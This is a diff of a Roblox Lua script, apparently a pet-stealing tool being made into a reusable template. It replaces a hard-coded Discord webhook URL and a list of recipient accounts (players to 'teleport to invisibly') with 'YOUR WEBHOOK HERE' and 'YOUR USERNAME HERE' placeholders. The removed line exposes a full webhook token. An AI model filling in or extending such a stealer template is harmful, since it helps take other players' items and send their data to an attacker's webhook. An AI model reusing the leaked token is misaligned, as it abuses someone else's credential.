@@ -7,38 +7,12 @@ local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
+local WEBHOOK_URL = "YOUR WEBHOOK HERE"
 local dataModule = require(ReplicatedStorage.Modules.DataService)
 
 -- Whitelisted usernames that when join, you teleport to them invisibly
 local USERNAMES = {
-    "HelloWorld_Z99",
-    "Kuni_Loot",
-    "Kuni_Loot1",
-    "Kuni_Loot02",
-    "Kuni_Loot3",
-    "Elaine_Pets",
-    "Elaine_Pets1",
-    "Elaine_Pets2",
-    "Elaine_Pets3",
-    "Elaine_Pets4",
-    "Elaine_Pets5",
-    "Elaine_Pets6",
-    "Elaine_Pets7",
-    "Elaine_Pets8",
-    "Elaine_Pets9",
-    "Elaine_Pets10",
-    "Elaine_Pets11",
-    "Elaine_Pets12",
-    "Elaine_Pets13",
-    "Elaine_Pets14",
-    "Elaine_Pets15",
-    "Elaine_Pets16",
-    "Elaine_Pets17",
-    "Elaine_Pets18",
-    "Elaine_Pets19",
-    "Elaine_Pets20",
-    "BEESUYAH"
+    "YOUR USERNAME HERE"
 }
 
 -- PET whitelist map: pet name => UUID
